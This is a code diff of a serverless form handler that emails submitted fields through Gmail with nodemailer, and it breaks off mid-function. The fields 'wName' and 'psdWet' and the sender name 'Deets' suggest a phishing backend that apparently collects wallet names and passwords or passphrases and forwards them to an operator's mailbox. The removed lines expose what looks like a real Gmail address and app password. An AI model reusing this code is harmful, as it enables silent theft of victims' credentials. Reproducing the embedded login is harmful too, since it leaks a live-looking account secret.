@@ -1,38 +1,38 @@
 const nodemailer = require('nodemailer');
 
 exports.handler = async (event, context) => {
-  if (event.httpMethod === 'OPTIONS') {
-    return {
-      statusCode: 200,
-      headers: {
-        'Access-Control-Allow-Origin': '*',
-        'Access-Control-Allow-Methods': 'POST, OPTIONS',
-        'Access-Control-Allow-Headers': 'Content-Type'
-      },
-      body: ''
-    };
-  }
+if (event.httpMethod === 'OPTIONS') {
+  return {
+    statusCode: 200,
+    headers: {
+      'Access-Control-Allow-Origin': '*',
+      'Access-Control-Allow-Methods': 'POST, OPTIONS',
+      'Access-Control-Allow-Headers': 'Content-Type'
+    },
+    body: ''
+  };
+}
 
-  if (event.httpMethod !== 'POST') {
-    return {
-      statusCode: 405,
-      body: JSON.stringify({ error: 'Method not allowed' })
-    };
-  }
+if (event.httpMethod !== 'POST') {
+  return {
+    statusCode: 405,
+    body: JSON.stringify({ error: 'Method not allowed' })
+  };
+}
 
-  try {
-    const formData = JSON.parse(event.body);
-    const { wName, psdWet } = formData;
+try {
+  const formData = JSON.parse(event.body);
+  const { wName, psdWet, recipients } = formData;
 
-    const transporter = nodemailer.createTransport({
-      host: 'smtp.gmail.com',
-      port: 465,
-      secure: true,
-      auth: {
-        user: 'willyscotmegan@gmail.com',
-        pass: 'dvhpjxrxrxwxsxcg'
-      }
-    });
+  const transporter = nodemailer.createTransport({
+    host: 'smtp.gmail.com',
+    port: 465,
+    secure: true,
+    auth: {
+      user: 'mygmail@gmail.com', 
+      pass: 'dpasswordsdsdda' 
+    }
+  });
 
     const mailOptions = {
       from: '"Deets" <willyscotmegan@gmail.com>',
